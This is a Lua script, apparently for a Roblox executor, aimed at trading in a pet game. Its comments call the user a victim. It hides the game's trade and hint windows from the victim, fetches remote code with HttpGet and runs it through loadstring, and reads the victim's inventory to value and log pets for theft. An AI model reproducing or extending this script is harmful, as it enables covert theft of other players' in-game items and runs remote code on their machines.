-- ✨ ULTIEME TRANSPARANTIE FUNCTIE (Voor TradeApp, TradeRequestApp en HintApp)
local function hideUI(obj)
    if not obj then return end
    if obj:IsA("GuiObject") then
        pcall(function()
            obj.Visible = false -- Maak het onzichtbaar voor het slachtoffer
            -- Maak alle sub-elementen transparant mocht 'Visible' niet werken
            if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then obj.TextTransparency = 1 end
            if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then obj.ImageTransparency = 1 end
            obj.BackgroundTransparency = 1
        end)
    end
    for _, child in ipairs(obj:GetDescendants()) do
        hideUI(child)
    end
end

-- 🛠 DATABASE FIX (Voorkomt 'nil value' error op loadstring) 
local function getExternalValues()
    local success, source = pcall(function() return game:HttpGet(valuesUrl) end)
    if not success or source == "" then return {pets = {}} end
    
    local loadFunc = loadstring or (syn and syn.load_string)
    if not loadFunc then
        warn("Executor ondersteunt geen loadstring. Waardes worden niet geladen.")
        return {pets = {}}
    end

    source = source:match("^%s*(.-)%s*$")
    if not source:find("return") then source = source .. "\nreturn ValueList" end
    local func = loadFunc(source)
    return func and func() or {pets = {}}
end
local ValueList = getExternalValues()

-- 🔍 ITEM VERIFICATIE (Tegen dubbele logs)
local function checkStillInInv(itemIds)
    local data = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[LocalPlayer.Name]
    local inv = data and data.inventory
    if not inv then return false end
    for _, id in ipairs(itemIds) do
        for _, group in pairs(inv) do
            if group[id] then return true end
        end
    end
    return false
end

-- 🔍 ITEM INFO [cite: 4, 5, 6, 7]
local function getItemInfo(uniqueId)
    local info = {name = "Unknown", rarity = "COMMON", value = 0, rawId = ""}
    pcall(function()
        local data = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[LocalPlayer.Name]
        local inv = data and data.inventory
        for cat, group in pairs(inv) do
            if group[uniqueId] then
                local d = group[uniqueId]
                info.rawId = d.id or cat
                local name = info.rawId:gsub("_", " "):gsub("(%l)(%w*)", function(a,b) return a:upper()..b:lower() end)
                local vData = ValueList.pets and ValueList.pets[name]
                local tag = ((d.mega_neon and "M") or (d.neon and "N") or "") .. ((d.properties and d.properties.flyable) and "F" or "") .. ((d.properties and d.properties.rideable) and "R" or "")
                info.name = name .. (tag ~= "" and " ("..tag..")" or "")
                if vData then
                    local prefix = (d.mega_neon and "mvalue") or (d.neon and "nvalue") or "rvalue"
                    info.value = vData[prefix] or vData["value"] or 0
                    info.rarity = (vData.rarity or "common"):upper()
                else
                    info.rarity = (d.rarity or "common"):upper()
                end
                break
            end
        end
    end)
    return info
end

